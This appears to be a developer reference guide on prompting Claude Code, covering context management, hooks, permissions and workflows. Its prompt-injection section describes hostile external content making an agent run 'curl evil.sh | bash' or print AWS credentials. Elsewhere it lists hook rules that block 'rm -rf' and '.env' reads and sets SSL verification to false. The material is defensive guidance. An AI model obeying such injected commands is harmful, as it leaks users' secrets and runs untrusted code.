# Prompting Claude Code
### Context engineering, workflows, and prompt patterns — a developer reference

*Compiled August 2026. Claude Code ships weekly; verify version-specific flags with `claude --version` and `/help`.*

---

## 1. Start Here

Prompting Claude Code is context engineering, not prompt writing. The single constraint everything flows from is that the context window degrades as it fills — a phenomenon Chroma Research formalized in its July 2025 report *Context Rot: How Increasing Input Tokens Impacts LLM Performance*, which found across 18 frontier models that performance grows increasingly unreliable as input length grows, even on trivial retrieval tasks.

Your real job is feeding the model the smallest set of high-signal tokens and giving it a check it can run itself. Be specific, scope hard, give a definition of done, make it verify its own work.

### If you only remember five things

1. **Scope hard and give a runnable definition of done.** Name the files, state what is out of scope, and end every real task with a check Claude can run — test, build, lint, screenshot. This one habit fixes most bad output.
2. **Manage context like a budget.** New task, new session. Corrected twice, `/clear` and rewrite. Went down a wrong path, rewind instead of stacking corrections. Run `/context` when it feels slow.
3. **Keep CLAUDE.md lean; push everything else to skills, subagents, and hooks.** If a line does not change behavior, cut it. On-demand knowledge goes in skills. Heavy exploration goes to subagents. Must-happen-every-time goes in a hook.
4. **Prefer CLI tools over MCP for reads and high-frequency loops,** and cache external context to local markdown files.
5. **Always review the diff, and never let it weaken tests to pass.** Confirm tests fail for the right reason, read what it writes, sandbox anything autonomous.

> **CORE CONSTRAINT** — Anthropic states it plainly: "Most best practices are based on one constraint: Claude's context window fills up fast, and performance degrades as it fills." Every technique in this guide is downstream of managing that budget.

---

## 2. Key Findings

1. **The context window is the master constraint.** Everything else is downstream.
2. **Specificity is the highest-leverage lever.** Weak-versus-strong prompt pairs from Anthropic's own docs show most quality gains come from scoping the task, pointing at files and patterns, and stating what "done" means.
3. **Give Claude a feedback loop it can run.** Tests, a build, a linter, a screenshot diff. It is the difference between a session you watch and one you walk away from. Without a check, "looks done" is the only signal and you become the verification loop.
4. **Explore, Plan, Code, Commit.** Use Plan Mode to separate research from execution. Skip it for one-sentence-diff changes.
5. **Manage sessions deliberately.** `/clear` between unrelated tasks, `/compact` mid-task when bloated, `/rewind` instead of correcting, subagents for anything that generates output you will only need the conclusion of.
6. **The extension stack has clear roles.** CLAUDE.md for lean always-on memory, skills for on-demand workflows, subagents for isolated context, hooks for deterministic gates, MCP for external systems.
7. **CLI beats MCP for token efficiency.** Tool definitions cost roughly 550 to 1,400 tokens per tool. Lazy loading cut this dramatically in early 2026, but CLI tools like `gh` and `glab` still win for high-frequency loops because they consume tokens only when invoked.

---

## 3. Prompting Fundamentals Specific to Claude Code

### 3.1 How it differs from chat and the API

Claude Code is an agentic loop. It reads files, runs commands, edits code, and iterates autonomously. Anthropic frames it this way: instead of writing code yourself and asking Claude to review it, you describe what you want and Claude figures out how to build it. Four consequences follow.

- **You are steering an agent, not requesting text.** The prompt is a task spec, not a question. Constraints, scope boundaries, and a definition of done matter far more than in chat.
- **It gathers its own context.** You do not need to paste files. Use `@file` references, tell it to read directories, or let it grep. But unscoped exploration burns context — the "infinite exploration" failure mode.
- **Extended-thinking trigger words work in the CLI specifically** — "think" is weaker than "think hard" or "megathink," which are weaker than "ultrathink" — unlike claude.ai or the raw API. See section 9 for the 2026 caveat.
- **It has persistent, reversible state.** Checkpoints, `/rewind`, and `--resume` mean you can take risks and roll back.

### 3.2 Specificity and scope control

This is the core skill. Anthropic's own weak-to-strong pairs:

| | |
|---|---|
| **WEAK** | add tests for foo.py |
| **STRONG** | write a test for foo.py covering the edge case where the user is logged out. avoid mocks. |
| **WEAK** | fix the login bug |
| **STRONG** | users report that login fails after session timeout. check the auth flow in src/auth/, especially token refresh. write a failing test that reproduces the issue, then fix it |
| **WEAK** | why does ExecutionFactory have such a weird api? |
| **STRONG** | look through ExecutionFactory's git history and summarize how its api came to be |

**To stop over-engineering and wandering:**

- **State scope boundaries explicitly.** "Change only files under `src/auth/`. Do not touch the build config or tests in other modules."
- **Name what is out of scope.** "Do not add new dependencies. Do not refactor unrelated code. If you think something outside this scope needs changing, stop and tell me instead of doing it."
- **Constrain the solution space.** "Build from scratch without libraries other than the ones already used in the codebase."
- **Beware the adversarial-reviewer trap.** A reviewer told to find gaps will usually report some, even when the work is sound, and chasing every finding leads to over-engineering. Tell reviewers to flag only correctness and requirement gaps.

### 3.3 Definition of done, up front

Make "done" executable. The strongest pattern gives four things: the behavior, a scope boundary, a finish line, and a stop condition.

```
Bug: Expired invite tokens are accepted.

Task: Write the failing regression test first in the closest test file.
Then implement the smallest production change that makes it pass.

Verification: Run  bun test:unit -- src/lib/server/invitations.test.ts
and  bun run lint

Stop: If either command fails for an unrelated reason, stop and report
instead of editing unrelated files.
```

### 3.4 Point at reference implementations

Point at patterns rather than describing them: "look at how existing widgets are implemented on the home page. HotDogWidget.php is a good example. follow the pattern." This beats abstract description because the model copies concrete, in-repo structure.

### 3.5 Step-by-step versus high-level

Give **high-level goals** when the approach is clear and you want the model to figure out the how. Give **step-by-step** when there is a specific sequence, side effects, or a house method. Rule of thumb: if you could describe the diff in one sentence, just ask for it directly and skip planning entirely.

### 3.6 Make it interview you

Best for larger features. Then start a fresh session to execute the spec.

```
I want to build [brief description]. Interview me in detail using the
AskUserQuestion tool.

Ask about technical implementation, UI/UX, edge cases, concerns, and
tradeoffs. Don't ask obvious questions, dig into the hard parts I might
not have considered.

Keep interviewing until we've covered everything, then write a complete
spec to SPEC.md.
```

> **WHY THIS WORKS** — Time spent making the spec precise pays off more than time spent watching the implementation.

---

## 4. Context Engineering

### 4.1 CLAUDE.md: what goes in, what stays out

CLAUDE.md is loaded every session, so it is pure overhead unless it changes behavior. Anthropic's test for each line: would removing this cause Claude to make mistakes? If not, cut it. And the warning that matters most: **bloated CLAUDE.md files cause Claude to ignore your actual instructions.**

| Include | Exclude |
|---|---|
| Bash commands Claude cannot guess | Anything Claude can infer from reading the code |
| Code-style rules that differ from defaults | Standard language conventions it already knows |
| Test runner, and how to run a single test | Detailed API docs — link to them instead |
| Repo etiquette: branch naming, PR conventions | Information that changes frequently |
| Architecture decisions specific to your project | File-by-file descriptions of the codebase |
| Environment quirks, required env vars | Long tutorials and explanations |
| Non-obvious gotchas | "Write clean code" platitudes |

- **Generate a starter with `/init`,** then prune ruthlessly. Run `/doctor` on a checked-in CLAUDE.md and Claude proposes cuts for anything derivable from the code.
- **Emphasis is a scarce resource.** Add "IMPORTANT" to one stubborn rule. If you bold ten lines, none of them stands out.
- **The `#` shortcut:** type `#` followed by an instruction mid-session to append a memory to CLAUDE.md without leaving the session.
- **Hierarchy,** loaded by walking up the tree from the working directory: `~/.claude/CLAUDE.md` (personal, all projects), then the project root `CLAUDE.md` (team, checked into git), then subdirectory `CLAUDE.md` files (loaded on demand when Claude reads files there). Files above the working directory load in full at launch; subdirectory files load lazily. More specific and later-read instructions carry more weight, but do not rely on load order — keep rules non-contradictory.
- **Imports:** `@path/to/import` pulls in other files. Do not overdo it; every import adds tokens.
- **Auto memory (v2.1.59+):** Claude writes learnings from your corrections to a MEMORY.md-style file that is re-injected in future sessions. Treat CLAUDE.md as "your requirements" and auto memory as "what Claude observed about you." Edit or correct it when it is wrong.

### 4.2 Managing the window

Claude Code has a 1M-token window on current Sonnet. Bigger is not a fix for bad management. There are five options at every turn.

| Situation | Reach for | Why |
|---|---|---|
| Same task, context still relevant | Continue | Everything in the window is load-bearing |
| Went down a wrong path | Rewind (double-Esc) | Keep useful file reads, drop the failed attempt |
| Mid-task, bloated with stale debugging | `/compact <hint>` | Low effort, and you can steer the summary |
| Genuinely new task | `/clear` | Zero rot; you control what carries forward |
| Next step generates throwaway output | Subagent | Intermediate noise stays in the child context |

- **`/clear` versus `/compact`.** `/compact` summarizes — lossy, automatic, and steerable via `/compact focus on the auth refactor`. `/clear` wipes, and you write the new brief. Manual `/compact` beats passive autocompact because you can tell it the direction before it summarizes. Bad compacts happen when the model cannot predict the direction your work is going, and it is least intelligent right when autocompact fires.
- **New task, new session.** If you have corrected Claude more than twice on the same issue, `/clear` and rewrite the prompt. A clean session with a better prompt almost always outperforms a long session with accumulated corrections.
- **Durable state lives on disk, not in conversation.** Files, commits, and a `SPEC.md` or `PLAN.md` survive crashes and compaction. Conversation is lossy.
- **`/context`** shows the token grid by category. Run it when Claude feels slow — slowness usually means a full window, not a dumb model. **`/usage`** (merged from `/cost` and `/stats`) shows session cost with a per-skill, per-subagent, per-MCP breakdown.

### 4.3 File references and rich input

`@file` reads the file before responding. `@dir` references a directory. Paste or drag images directly. Give URLs for docs and allowlist domains with `/permissions`. Pipe data in with `cat error.log | claude`. Or tell Claude to fetch context itself via Bash or MCP.

### 4.4 Subagents for context isolation

The mental test: will I need this tool output again, or just the conclusion? If just the conclusion, use a subagent. Subagents get their own fresh window and return only a summary.

```
Use subagents to investigate how our auth system handles token refresh.

Spin up a subagent to verify this work against SPEC.md.
```

Define reusable ones in `.claude/agents/*.md` with their own tools and model — for example a read-only `explorer` pinned to Haiku.

### 4.5 MCP versus CLI: the token tradeoff

This is the decision that most affects long-run cost and reliability, and it matters especially if you are building a context-caching layer over external systems.

- MCP tool definitions cost roughly **550 to 1,400 tokens per tool.** GitHub issue #11364 on `anthropics/claude-code` cites 550 to 850 tokens per tool; other benchmarks report up to 1,400. Eager-loaded, this compounds fast: that same issue documents a seven-server setup consuming **67,300 tokens, or 33.7% of a 200K window,** in definitions alone — gone before any real work.
- **MCP Tool Search / lazy loading (v2.1.7, roughly January 2026)** changed the math. A lightweight search index of about 500 tokens loads at start, and full schemas fetch on demand. Anthropic's internal testing cut a large tool set from about 134K to about 5K tokens, an 85% reduction with full tool access retained. It auto-activates when MCP tools exceed roughly 10% of the window; toggle via `enable_tool_search`. Current docs say MCP tool definitions are deferred by default.
- **Even so, prefer CLI tools for high-frequency operations.** Anthropic: CLI tools are the most context-efficient way to interact with external services, and Claude already knows how to use `gh` for creating issues, opening pull requests, and reading comments. CLI tools consume tokens only when invoked and return to baseline afterward.
- **The benchmark numbers.** Scalekit's controlled test — 75 head-to-head runs on Claude Sonnet 4 — found MCP cost **4x to 32x more tokens than CLI** for identical operations. Its simplest test, checking a repository's language, consumed 1,365 tokens via CLI and 44,026 via MCP. Reliability dropped from 100% (CLI) to 72% (MCP) on hard tasks.
- **The best ROI finding in that benchmark:** a skill-augmented CLI — just an 800-token document of `gh` tips — reduced tool calls by a third and latency by a third versus naive CLI.

> **VERDICT** — Use MCP for interactive write operations where structured schemas add reliability, such as creating or transitioning tickets. Use CLI plus cached files for reads and high-frequency loops. Disable unused MCP servers per project, and run `/context` to audit.

### 4.6 Large codebases and monorepos

- Subdirectory CLAUDE.md files for per-component context.
- Delegate broad exploration to subagents.
- Use `rg` (ripgrep) to locate code before opening files. Read line ranges, not whole files.
- Run `git diff --stat` before requesting a full diff.

### 4.7 Just-in-time versus up-front loading

Anthropic uses a hybrid model. CLAUDE.md is dropped in up front, but glob and grep let Claude retrieve files just-in-time. JIT loading — lightweight identifiers like file paths, then load on demand — avoids stale indexes and mirrors human cognition: we generally do not memorize entire corpuses, we build external organization and indexing systems. Up-front loading suits stable reference content. JIT suits dynamic codebases.

---

## 5. Workflows and Patterns That Work

### 5.1 Explore, Plan, Code, Commit

1. **Explore** in Plan Mode — press Shift+Tab until you see plan mode on, or launch with `claude --permission-mode plan`. "Read /src/auth and understand how we handle sessions and login."
2. **Plan.** "I want to add Google OAuth. What files need to change? What is the session flow? Create a plan." Ctrl+G opens the plan in your editor so you can edit it before proceeding.
3. **Implement.** Approve the plan, then: "implement the OAuth flow from your plan. write tests for the callback handler, run the test suite and fix any failures."
4. **Commit.** "commit with a descriptive message and open a PR."

Plan mode adds overhead. Skip it for typos, log lines, and renames. Use it when you are uncertain about the approach, when the change spans multiple files, or when you are unfamiliar with the code.

### 5.2 Extended thinking

In the CLI, trigger words map to thinking budgets: "think" is roughly 4,000 tokens, "megathink" or "think hard" roughly 10,000, and "ultrathink" roughly 31,999 — values confirmed by reverse-engineering the Claude Code bundle.

**Escalate, do not start at the top.** Run normal first. If the answer is shallow, retry with "think hard." Escalate to "ultrathink" only when the normal response feels unsatisfying. Thinking tokens are billed as output, so an ultrathink pass can burn 10,000 to 30,000 or more. Worth it for architecture decisions, subtle multi-system bugs, and migration planning. Wasteful, and sometimes less accurate, on mechanical tasks.

> **2026 CAVEAT** — On the Claude 5 generation, thinking is adaptive and automatic, and the manual trigger words are being retired. See section 9.

### 5.3 Test-driven development

This is Claude Code's single best-fit workflow, but it requires forcing the inverse of the default. Claude writes implementation first unless told otherwise.

- Be explicit: "Write a FAILING test for [feature]. Do NOT write implementation yet."
- Confirm it fails **for the right reason** — a missing feature, not a broken test.
- Then "make it pass," then "refactor without changing behavior."
- **Add a verify step for agents specifically.** An agent that writes both the test and the code can write a test that always passes, which is worse than no test at all.
- For legacy code: "write characterization tests that capture current behavior. Then we will refactor with confidence."
- There is a built-in `test-driven-development` skill that enforces red-green-refactor.

### 5.4 Visual and screenshot-driven UI iteration

```
[paste screenshot] implement this design. take a screenshot of the result
and compare it to the original. list differences and fix them.
```

Claude in Chrome, or browser screenshots, close the loop so Claude self-corrects UI work without you in the middle of it.

### 5.5 Give it a feedback loop it can run

This is the highest-value habit in the entire guide. The options escalate by how hard they gate the stop.

- **In one prompt:** "run the tests and iterate until they pass."
- **Across a session:** set a `/goal` condition that a separate evaluator re-checks every turn.
- **Deterministic gate:** a Stop hook blocks the turn from ending until your check passes. It is overridden after eight consecutive blocks.
- **Second opinion:** an adversarial review subagent in fresh context, or the bundled `/code-review` skill.

Always demand evidence, not assertions: show the test output, the command you ran and what it returned, or a screenshot.

### 5.6 Course-correcting mid-task

- **Esc** stops Claude mid-action with context preserved, so you can redirect.
- **Esc Esc, or `/rewind`,** opens the rewind menu: restore conversation, code, or both to any checkpoint, or summarize from that point.
- **Rewind beats correcting.** If Claude read five files and tried a failed approach, do not type "that did not work, try X" — that keeps the failure in context. Rewind to just after the file reads and re-prompt: "Don't use approach A, the foo module doesn't expose that — go straight to B."
- **"Undo that"** reverts changes. But checkpoints only track Claude's file-edit tools, not Bash or external processes. This is not a git replacement.

### 5.7 Multi-Claude and parallel worktrees

- **Git worktrees** give each session its own branch and working directory while sharing one `.git`. Launch with `claude -w <name>`, which creates `.claude/worktrees/<name>/` on branch `worktree-<name>`, or set up worktrees manually and run `claude` in each. Practical ceiling is two or three parallel sessions before monitoring gets hard.
- **Writer/Reviewer.** Session A implements. Session B, in fresh context, reviews "for edge cases, race conditions, and consistency with existing middleware patterns." Feed B's output back to A. Fresh context reviews better because it is not biased toward code it just wrote.
- **Tester/Implementer.** One Claude writes tests, another writes code to pass them.

### 5.8 Headless and non-interactive mode

```bash
claude -p "Explain what this project does"                    # plain text
claude -p "List all API endpoints" --output-format json       # structured
claude -p "Analyze this log file" --output-format stream-json --verbose
```

This is the foundation for CI, pre-commit hooks, and cron. Fan out for large migrations:

```bash
for file in $(cat files.txt); do
  claude -p "Migrate $file from Python 2 to Python 3. Return OK or FAIL." \
    --allowedTools "Edit,Bash(git commit *)"
done
```

Test on two or three files, refine the prompt, then run at scale. `--allowedTools` restricts what runs unattended. There is also a built-in `/batch <instruction>` that splits a change across 5 to 30 subagents, each in its own worktree opening a PR.

### 5.9 Custom slash commands

Markdown files in `.claude/commands/` (project-level, shared via git) or `~/.claude/commands/` (personal). The filename becomes the command name. They support `$ARGUMENTS` or positional `$1`, `$2`, YAML frontmatter for `description`, `allowed-tools`, `argument-hint`, and `model`, and `!`-prefixed shell injection to embed live output.

````markdown
---
allowed-tools: Read, Grep, Glob, Bash(git diff:*)
description: Comprehensive PR review
---

## Changed Files
!`git diff --name-only HEAD~1`

## Detailed Changes
!`git diff HEAD~1`

Review for: correctness, security, performance, test coverage.
Prioritize findings.
````

> **2026 NOTE** — Custom commands were merged into skills in v2.1.101 (April 2026). Files in `.claude/commands/` still work. If a skill and a command share a name, the skill wins.

### 5.10 Hooks: deterministic guardrails

Hooks are shell scripts that run at lifecycle events, defined in `.claude/settings.json` at project level or `~/.claude/settings.json` at user level, with scopes combining. Unlike CLAUDE.md, which is advisory, hooks are guaranteed.

Key events: **PreToolUse** fires before a tool, and exit code 2 blocks it while feeding stderr back to Claude. **PostToolUse** fires after success — formatters and tests. **Stop** fires before Claude wraps up. There is also **SessionStart** and **SubagentStop**.

```json
{ "hooks": { "PostToolUse": [ { "matcher": "Write",
  "hooks": [ { "type": "command",
               "command": "cd $CLAUDE_PROJECT_DIR && pnpm lint --fix",
               "timeout": 30 } ] } ] } }
```

Common uses: block `rm -rf`, block edits to generated or migration folders, block reads of `.env` (PreToolUse, exit code 2 on a `file_path` match), auto-format and run a narrow lint (PostToolUse), and fire a desktop notification when a long run finishes (Stop). Hooks fire for subagent tool calls too. Keep PreToolUse hooks under a second. Claude can write hooks for you — "Write a hook that runs eslint after every file edit." Handler types are command, prompt, agent, and http.

### 5.11 Skills versus slash commands versus subagents

- **Skills** live in `.claude/skills/<name>/SKILL.md`. They are on-demand and either model-invoked by description match or manually triggered via `/skill-name`. Progressive disclosure — metadata, then instructions, then bundled resources — makes them context-efficient, so they do not bloat every session the way CLAUDE.md or eager MCP does. Use `disable-model-invocation: true` for side-effecting workflows you only want triggered manually. Skills can compose, calling other skills, MCP, or subagents.
- **Slash commands** are explicit, user-triggered prompts, now merged into skills.
- **Subagents** get isolated fresh context and return only a summary. They cannot call other subagents, though nested subagents up to three levels arrived in mid-2026.

> **RULE OF THUMB** — Always-loaded rule goes in CLAUDE.md. On-demand workflow or domain knowledge goes in a skill. Heavy exploration or verification goes to a subagent. Must-happen-every-time enforcement goes in a hook. External systems go through MCP or a CLI.

### 5.12 Checkpointing, resume, session continuity

Every prompt is a checkpoint. `claude --continue` resumes the latest session; `claude --resume` lets you pick from a list; `/rename` names sessions. Treat them like branches — name one `oauth-migration`. Sessions persist locally with checkpoints, so you can close the terminal and rewind later.

---

## 6. Tools, Permissions, and Safety

### 6.1 Permission modes and prompt fatigue

In Manual mode Claude asks before writes, Bash, and MCP tools. Safe, but tedious — after the tenth approval you are clicking through rather than reviewing, and Anthropic notes users accept roughly 93% of prompts anyway. Two safe ways to cut interruptions:

- **Allowlists.** Pre-approve known-safe tools via `/permissions` — `npm run lint`, `git commit` — which writes to `settings.json`.
- **Sandboxing (`/sandbox`).** OS-level filesystem and network isolation so Claude works freely within boundaries.
- **Auto mode,** the default on Pro, Max, and Team interactive sessions. A classifier model reviews actions and blocks only risky ones: scope escalation, unknown infrastructure, hostile-content-driven actions. Example: `claude --permission-mode auto -p "fix all lint errors"`.

### 6.2 The dangerous flag

`--dangerously-skip-permissions`, also called bypassPermissions or YOLO mode, disables all prompts. **Never run it on your bare host.** An agent runs as your UID and can read or delete anything you can, including SSH keys, `.env` files, and cloud credentials.

It is safe only inside a sandbox. Anthropic's guidance is to use it only in a sandbox without internet access, or one with strict egress allowlisting like the reference devcontainer. One caveat worth internalizing: even the reference devcontainer does not prevent a malicious project from exfiltrating anything inside the container, including `~/.claude` credentials. So use it only with trusted repos, avoid mounting `~/.ssh` or cloud credentials, and prefer short-lived repo-scoped tokens. To ban the flag organization-wide, set `permissions.disableBypassPermissionsMode: "disable"` in managed settings.

> **IF YOU DEVELOP ON REMOTE VMs** — A devcontainer, or the VM itself treated as disposable with secrets kept off it, is the natural place to run autonomous sessions.

### 6.3 Prompt injection

This is real, not theoretical. Whenever Claude reads external content — Jira issues, web pages, MCP data, GitHub or GitLab issue bodies — a malicious payload can instruct it to run `curl evil.sh | bash` or print `~/.aws/credentials`.

Mitigations: use a sandbox or devcontainer as a blast-radius backstop; rely on the auto-mode classifier, which flags hostile-content-driven actions; add PreToolUse hooks blocking `.env` reads and dangerous commands; keep secrets out of the working tree; and review diffs before committing. This matters most if you are building an ingestion layer over ticket and wiki systems — treat all ingested text as untrusted input.

### 6.4 Git safety

- Commit early and often. It is your real safety net for reverting.
- Work on branches. Worktrees enforce branch-per-task automatically.
- Remember checkpoints are not a git replacement — they miss Bash-made changes.
- Have Claude commit with descriptive messages and open PRs.

---

## 7. Prompt Patterns and Templates

### 7.1 Bug fixing from a stack trace

**WEAK:** fix this error

**STRONG:**
```
Here's the stack trace: [paste].

Reproduce it with a failing test first, in the closest existing test file.
Then fix the root cause — do not suppress the error or catch-and-ignore.

Scope: only files in the call path. Run [test cmd] and confirm green.
Show me the diff and the test output before committing.
```

### 7.2 Implementing a feature from a ticket

```
Implement PROJ-1234 (I've cached it at @docs/jira/PROJ-1234.md).

Explore first, in plan mode: read @src/orders/ and follow the pattern in
OrderService.ts. Then write a plan to PLAN.md listing files to change and
what's out of scope.

Wait for my approval before coding. Write tests for each acceptance
criterion.
```

### 7.3 Refactoring safely

```
Refactor @src/payments/legacy.ts for readability.

FIRST write characterization tests that capture current behavior and
confirm they pass. Then refactor in small steps, running tests after each.

Do not change public signatures or behavior. If a signature must change,
stop and ask.
```

### 7.4 Increasing test coverage

```
Write tests for @src/utils/validation.ts.

Cover: empty strings, unicode and special characters, very long input,
and the null-vs-undefined distinction. Avoid mocks where a real object
works.

Run the suite and show coverage before and after.
```

### 7.5 Code review of a diff or PR

Use the `/code-review` skill, or spin up a fresh subagent:

```
Use a subagent to review the rate-limiter diff against PLAN.md.

Check every requirement is implemented, listed edge cases have tests, and
nothing outside scope changed.

Report only gaps affecting correctness or requirements — not style
preferences.
```

### 7.6 Onboarding to an unfamiliar codebase

No special prompting needed here. Ask the way you would ask a senior engineer.

```
How does logging work here?
How do I add a new API endpoint?
What does async move {...} do on line 134 of foo.rs?
What edge cases does CustomerOnboardingFlowImpl handle?
```

### 7.7 Large mechanical migrations

Fan out with `claude -p` as shown in section 5.8. Test the prompt on two or three files before running at scale.

### 7.8 Performance optimization

```
Endpoint GET /api/orders p95 is 1200ms.

Profile first — add timing or use [profiler] and show me where the time
goes before changing anything.

Then propose the top 2 fixes with expected impact. Implement only the one
I pick. Benchmark before and after and show numbers.
```

### 7.9 Documentation

Often best as a subagent working off your git changes.

```
Spin off a subagent to write docs for this feature based on my git changes
(git diff main). Match the style of @docs/features/. Don't document
internal helpers.
```

### 7.10 Incident and production debugging from logs

```
cat prod-error.log | claude

Then: "Group these errors by root cause, rank by frequency, and identify
the single most likely culprit with the file:line. Propose a minimal
hotfix and a separate longer-term fix. Do not change code yet — give me
the analysis first."
```

---

## 8. Anti-Patterns and Common Mistakes

- **Vague one-liners** when you are not exploring. Fine for "what would you improve here?" Bad for real tasks.
- **The kitchen-sink session,** where unrelated tasks pile up in one window. Use `/clear` between tasks.
- **Correcting over and over.** After two failed corrections, `/clear` and rewrite the prompt, or rewind.
- **Over-stuffed CLAUDE.md.** Important rules get lost and Claude ignores half of it. If a rule is repeatedly ignored, the file is probably too long. Prune it, or convert it to a hook.
- **Too many MCP servers** eating the window. Lazy loading mitigates this but does not eliminate it. Disable unused servers per project.
- **Letting Claude "fix" tests by weakening them or hardcoding** to pass. This shows up in code-generation audits as the occasional test that trivially forces a pass. Guard against it with the verify step — confirm the test fails for the right reason first — by reading the tests it writes, and by adding a Stop hook that runs the real suite.
- **Rubber-stamping diffs.** Plausible code that misses edge cases is the main failure mode. If you cannot verify it, do not ship it. Claude is an assistant, not a replacement for human oversight.
- **Asking for too much in one prompt.** Decompose. One task per session.
- **Trusting confident claims about code it has not read.** Make it cite file and line, and show evidence.
- **Not recognizing unproductive loops.** Creating multiple throwaway scripts, or retrying slight variations, means it is thrashing. Hit Esc, rewind, and give a sharper constraint.
- **Using it for the wrong job.** Tasks needing information that is not in the repo or tools and not verifiable; deeply proprietary judgment calls; anything you cannot check. Also do not reach for planning agents, subagents, or custom infrastructure for problems the platform already solves — Plan Mode already handles most planning-agent needs.

---

## 9. Advanced and Power-User

### 9.1 Model selection

Anthropic ships tiers whose names describe a capability, cost, and speed tradeoff more than a specific version. Practical policy: **default to Sonnet, escalate to Opus only when Sonnet stalls, and drop to Haiku for grunt work.**

| Tier | Use it for |
|---|---|
| Sonnet | The default. Best balance for nearly all coding work, with a 1M context window. |
| Opus | Hardest reasoning, long agentic chains, subtle multi-file bugs. Escalate here, don't start here. |
| Haiku | Fast and cheap. Mechanical renames, boilerplate, high-volume fan-out, read-only explorer subagents. |

- Switch mid-session with `/model`. `/model opusplan` uses Opus for planning and Sonnet for execution.
- Pin per-subagent models in frontmatter — `model: haiku` for a read-only explorer.
- Configure `--fallback-model sonnet,haiku` for overload resilience.
- Opus requires a Max plan or API billing. Pro includes Sonnet and Haiku.

### 9.2 Thinking in 2026: what changed

The classic trigger words worked by mapping to fixed budgets of roughly 4K, 10K, and 32K tokens. On the **Claude 5 generation, adaptive thinking is on by default and manual extended thinking (`budget_tokens`) has been removed** — it returns a 400 error on Sonnet 5 and is deprecated on 4.6. So on current models, do not rely on magic words. The model allocates thinking adaptively; use `/effort` with low, medium, high, xhigh, or max on effort-capable models instead. The old words still parse harmlessly.

### 9.3 Token efficiency and cost control

- Prefer CLI tools over MCP.
- Cache external context to files rather than re-fetching it live every turn.
- Use `/clear` aggressively.
- Read line ranges, not whole files. Use `rg` before opening anything.
- Delegate exploration to subagents so the noise stays out of your main window.
- Run `git diff --stat` before requesting a full diff.
- Restrict `--allowedTools` in headless runs.
- Monitor with `/context` and `/usage`.
- **CLAUDE.md benefits from prompt caching.** The first request per session pays full price; subsequent requests within about five minutes hit the cache at a much lower read rate. Any edit to CLAUDE.md invalidates the cache — another reason to keep it stable and lean.

### 9.4 Output style and verbosity

Ask directly — "be terse; show diffs not explanations." Set persistent preferences in CLAUDE.md. Use `/btw` for side questions whose answers you do not want polluting the context.

### 9.5 Images and design mocks

Paste or drag them in. Combine with the screenshot-diff loop from section 5.4 for pixel-matching UI work.

### 9.6 Claude writing its own configuration

Meta-configuration is a legitimate, high-ROI use. "Write a hook that blocks writes to migrations/." "Generate a CLAUDE.md from this repo" — or just run `/init`. "Create a slash command that runs our PR-review checklist."

### 9.7 CI integration

For GitHub, use the official `anthropics/claude-code-action@v1`, where `@claude` triggers in issues and PRs. **GitLab has no native action, but headless mode works identically** — set `ANTHROPIC_API_KEY` in Settings, CI/CD, Variables, enable secret masking, and run `claude -p` in a job.

Restrict tools hard in CI. Use `--allowedTools "Read,Grep,Glob"` for review pipelines and exclude Bash to prevent code execution. CLAUDE.md rules apply in headless mode too. Reported cost is around three cents per 500-line-diff review.

### 9.8 Self-hosted stack integration

If you run GitLab, Jira, and Confluence on your own infrastructure, the tooling picture is different from the Cloud story.

**Jira and Confluence Data Center / Server.** The official Atlassian Rovo MCP is **Cloud-only** and will not connect to self-hosted instances. Use the community `sooperset/mcp-atlassian` (MIT licensed, also on PyPI and as `ghcr.io/sooperset/mcp-atlassian`). It supports both Cloud and Server/Data Center deployments, covering Jira 8.14+ and Confluence 6.0+ using a Personal Access Token.

```bash
# Self-hosted env vars (PAT auth instead of username + API token)
JIRA_URL=https://jira.internal
JIRA_PERSONAL_TOKEN=...
CONFLUENCE_URL=https://confluence.internal
CONFLUENCE_PERSONAL_TOKEN=...

# Self-signed certs
JIRA_SSL_VERIFY=false
CONFLUENCE_SSL_VERIFY=false

# Optional scoping — do this, it cuts noise a lot
JIRA_PROJECTS_FILTER=PROJ,OPS
CONFLUENCE_SPACES_FILTER=ENG
READ_ONLY_MODE=true
```

Runs via `uvx mcp-atlassian` or Docker, so it can sit behind your VPN. Register it with `claude mcp add`, passing env vars via `--env` and using `--scope project` to keep config in the repo.

**Self-hosted GitLab.** Prefer the official `glab` CLI over an MCP server for token efficiency. It supports self-hosted instances via `GITLAB_HOST` (aliased as `GITLAB_URI`) and `GITLAB_TOKEN`.

```bash
glab auth login --host gitlab.example.com
glab config set -g host gitlab.example.com
```

`glab` ships an experimental built-in `glab mcp serve`, but it is flagged experimental and has known issues surfacing tools in Claude Code — treat it as immature. If you need structured tools, community options include `zereight/gitlab-mcp` (self-hosted ready, PAT or OAuth2) and `iwakitakuma/gitlab-mcp` (`GITLAB_API_URL` plus `GITLAB_PERSONAL_ACCESS_TOKEN`). GitLab Duo also acts as an MCP client as of 18.8 GA, but needs Duo licensing.

**The token-efficient ingestion architecture.** Use CLIs and scripts — `glab` for repos, `curl` with a PAT or the mcp-atlassian export for Atlassian — to **fetch and cache tickets, pages, and repo context into versioned local markdown files**, with frontmatter for IDs and a mapping JSON. Then feed them via `@path` references or a lean CLAUDE.md rather than making live MCP calls per query.

The reason this wins: cached files loaded once per session ride the prompt cache at cheap read rates, while live MCP calls re-inject schema and response every turn. Reserve live MCP for interactive writes such as creating or transitioning tickets, and let Tool Search keep any registered MCP schemas lazy-loaded. Also worth knowing about: `eunsanMountain/atlassian-skills`, a token-efficient CLI for Atlassian Server/DC positioned as a drop-in alternative to mcp-atlassian for LLM agents, with compact output and lossless XHTML-to-Markdown round-tripping.

> **SECURITY NOTE** — Treat all ingested ticket and wiki text as untrusted. It is a prompt-injection surface.

### 9.9 Recent features that change best practices

- 1M context on current Sonnet and Opus — context management still matters, because rot is real.
- MCP Tool Search / lazy loading (v2.1.7): MCP overhead down roughly 85%, deferred by default.
- Custom commands merged into skills (v2.1.101).
- Auto mode: classifier-based, safer permissions.
- Adaptive thinking replacing manual trigger words on Claude 5.
- Nested subagents up to three levels, `fallbackModel` chains, per-agent cost attribution.
- `/goal` for run-until-condition, `/batch` for fan-out, `/usage` merging cost and stats, `/rewind` with checkpoints.

> **BET ON PATTERNS, NOT FLAGS** — Anthropic ships weekly. The pattern (research, plan, execute, review, ship) outlives any specific flag. Verify specifics with `claude --version` and `/help`.

---

## 10. A Staged Adoption Plan

**Day one**
- Run `/init`, then prune CLAUDE.md to under one screen.
- Install `gh` or `glab`.
- Adopt the Explore, Plan, Code, Commit loop and the runnable-done habit.
- Commit before every big change.

**Week one**
- Add two or three custom slash commands: PR review, commit, fix-issue.
- Add a PostToolUse format hook and a PreToolUse `.env`-block hook.
